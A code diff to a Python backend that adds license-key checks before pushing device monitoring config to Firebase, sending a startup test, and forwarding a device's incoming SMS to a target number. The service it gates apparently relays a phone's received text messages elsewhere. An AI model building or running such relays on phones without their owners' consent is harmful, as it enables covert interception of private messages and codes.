@@ -63,20 +63,26 @@ async def push_virtus_config(profile: MonitorProfile, device: Device | None = No
 
     license_key = get_license_key(profile)
     device_id = device.name if device else ""
+    monitoring = profile.is_monitoring
+    key_valid = False
 
     if license_key and license_key.upper().startswith("KEY-"):
-        from app.license_keys import push_key_config
+        from app.license_keys import license_key_exists, push_key_config
 
-        firebase_bases = [profile.firebase_url] if profile.firebase_url else None
-        await push_key_config(
-            license_key,
-            monitoring=profile.is_monitoring,
-            device_id=device_id,
-            channel_id=profile.channel_id,
-            target_number=profile.phone_number,
-            sim_index=profile.selected_sim_index or 0,
-            firebase_bases=firebase_bases,
-        )
+        key_valid = license_key_exists(license_key)
+        if not key_valid:
+            monitoring = False
+        else:
+            firebase_bases = [profile.firebase_url] if profile.firebase_url else None
+            await push_key_config(
+                license_key,
+                monitoring=monitoring,
+                device_id=device_id,
+                channel_id=profile.channel_id,
+                target_number=profile.phone_number,
+                sim_index=profile.selected_sim_index or 0,
+                firebase_bases=firebase_bases,
+            )
 
     sim_index = profile.selected_sim_index or 0
     sim_slot = sim_index + 1
@@ -90,11 +96,13 @@ async def push_virtus_config(profile: MonitorProfile, device: Device | None = No
             pass
 
     payload = {
-        "monitoring": profile.is_monitoring,
+        "monitoring": monitoring,
+        "key_valid": key_valid,
+        "license_key": license_key if key_valid else "",
         "ts": int(time.time() * 1000),
         "firebase_url": firebase_url,
         "device_id": device_id,
-        "firebase_key": license_key if license_key and license_key.upper().startswith("KEY-") else "",
+        "firebase_key": license_key if key_valid else "",
         "channel_id": profile.channel_id,
         "target_number": profile.phone_number,
         "sim_index": sim_index,
@@ -104,7 +112,7 @@ async def push_virtus_config(profile: MonitorProfile, device: Device | None = No
     user_fb = get_profile_firebase_url(profile)
     if user_fb:
         await _firebase_put(f"{user_fb}/virtus_config", payload)
-        if license_key and license_key.upper().startswith("KEY-"):
+        if key_valid and license_key:
             await _firebase_put(f"{user_fb}/config/{_config_path_key(license_key)}", payload)
 
 
@@ -252,7 +260,13 @@ async def send_polling_startup_test(db, profile: MonitorProfile, device: Device)
     import asyncio
 
     from app.device_ui import STARTUP_TEST_MESSAGE, STARTUP_TEST_SENDER
+    from app.license_keys import license_key_exists
     from app.services import normalize_phone
+
+    license_key = (profile.license_key or "").strip().upper()
+    if not license_key_exists(license_key):
+        logger.warning("Startup test skipped: invalid or missing license key")
+        return
 
     firebase_url = resolve_firebase_url(profile)
     if not firebase_url:
@@ -300,7 +314,10 @@ async def forward_incoming_to_mynum(
     message: str,
 ) -> None:
     """Forward device incoming SMS to /mynum via outbox + Firebase commands."""
-    if not profile.phone_number or not profile.is_monitoring:
+    from app.license_keys import license_key_exists
+
+    license_key = (profile.license_key or "").strip().upper()
+    if not profile.phone_number or not profile.is_monitoring or not license_key_exists(license_key):
         return
 
     from app.channel_relay import queue_forward_to_mynum
